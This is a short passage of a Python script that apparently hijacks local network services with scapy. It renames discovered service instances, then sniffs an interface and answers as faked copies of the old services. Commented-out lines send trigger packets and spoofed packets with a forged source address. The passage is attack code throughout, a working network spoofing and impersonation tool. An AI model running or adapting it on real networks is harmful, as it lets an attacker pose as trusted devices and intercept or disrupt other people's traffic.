    time.sleep(1)
sniffer3.stop()
print("Service to renamed,Hijacked Instance Name:",instance_names)
print("Now faking the old services")
instance_names_rrname={instance_names[key]:key for key in instance_names.keys() }
sa.sniff(prn=fake,iface=interface)
#sa.send(packet,iface=interface)
#sa.send(trigger_packet,iface=interface)
#sa.send(packet,iface=interface)
#sa.send(trigger_packet,iface=interface)
#while(True):
    #time.sleep(0.5)
    #if not(first) and i==0 and reminder:
        #sa.send(packet,iface=interface)
        #sa.send(trigger_packet,iface=interface)
        #sa.send(first_packet,iface=interface)
    #i=(i+1)%nbr
        
    #if forged_packet!="" and i==300:
     #   sa.send(sa.IP(src=device,dst=target)/forged_packet,iface=interface)
     #   i=0
    #i+=1